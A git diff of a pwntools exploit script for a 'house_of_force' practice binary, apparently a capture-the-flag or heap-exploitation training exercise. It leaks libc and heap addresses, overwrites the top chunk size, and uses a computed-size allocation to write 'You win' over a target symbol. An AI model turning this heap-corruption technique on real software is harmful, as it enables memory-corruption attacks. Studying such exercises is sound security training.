@@ -5,43 +5,53 @@ context.binary = elf = ELF('./house_of_force', checksec=False)
 
 libc = elf.libc
 
+environ = {"LD_PRELOAD": libc.path}
+
 gs = """
 b *main
 b *main+295
 b *main+448
 """
 
-def info(mes):
-    return log.info(mes)
+info = lambda msg: log.info(msg)
+success = lambda msg: log.success(msg)
+sla = lambda msg, data: io.sendlineafter(msg, data)
+sa = lambda msg, data: io.sendafter(msg, data)
+sl = lambda data: io.sendline(data)
+s = lambda data: io.send(data)
+rcu = lambda data: io.recvuntil(data)
     
 def start():
     if args.GDB:
-        return gdb.debug(elf.path, env={"LD_PRELOAD": libc.path} ,gdbscript=gs)
+        return gdb.debug(elf.path, env=environ, gdbscript=gs)
     else:
         return process(elf.path)
     
-def malloc(io, size, data):
-    io.recvuntil(b'> ')
-    io.send(b'1')
-    io.recvuntil(b'size: ')
-    io.send(f'{size}'.encode())
-    io.recvuntil(b'data: ')
-    io.send(data)
+def malloc(size, data):
+    rcu(b'> ')
+    s(b'1')
+    rcu(b'size: ')
+    s(f'{size}'.encode())
+    rcu(b'data: ')
+    s(data)
  
 def delta(x, y):
     return (0xffffffffffffffff - x) + y
-    
+   
 io = start()
 
-io.recvuntil(b'puts() @ ')
-puts_leak = int(io.recvn(14), 16) 
-io.recvuntil(b'heap @ ')
-heap_leak = int(io.recvn(8), 16)
-info("The address of puts:: "+ hex(puts_leak))
-info("The address of heap: " + hex(heap_leak))
+rcu(b'puts() @ ')
+puts_leak = int(io.recvline(), 16) 
+rcu(b'heap @ ')
+heap_leak = int(io.recvline(), 16)
+
+success(f"puts @ {hex(puts_leak)}")
+success(f"heap @ {hex(heap_leak)}")
+
 distance = delta(heap_leak + 0x20, elf.sym['target'] - 0x20)
-malloc(io, 24, b'a'*24 + p64(0xffffffffffffffff))
-malloc(io, distance, b'oke')
-malloc(io, 24, b'You win')
+
+malloc(24, b'a'*24 + p64(0xffffffffffffffff))
+malloc(distance, b'oke')
+malloc(24, b'You win')
 
 io.interactive() 
